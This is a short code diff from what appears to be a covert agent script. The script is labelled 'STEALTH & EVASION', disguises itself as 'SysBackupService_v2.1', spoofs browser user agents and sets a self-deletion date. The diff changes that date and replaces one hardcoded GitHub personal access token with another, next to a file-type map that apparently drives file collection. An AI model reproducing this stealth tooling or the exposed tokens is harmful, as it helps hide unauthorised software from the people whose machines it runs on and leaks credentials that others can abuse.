@@ -16,7 +16,7 @@ import psutil
 import random
 
 # ---------------- STEALTH & EVASION ----------------
-DELETE_DATE = "2026-12-31"
+DELETE_DATE = "2026-05-31"
 AGENT_NAME = "SysBackupService_v2.1"
 FAKE_USER_AGENTS = [
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
@@ -58,7 +58,7 @@ check_auto_delete()
 
 # ---------------- CONFIG ----------------
 GITHUB_USERNAME = "kailesh-waran-13"
-GITHUB_TOKEN = "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"
+GITHUB_TOKEN = "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"
 BRANCH = "main"
 
 FILE_TYPES = {
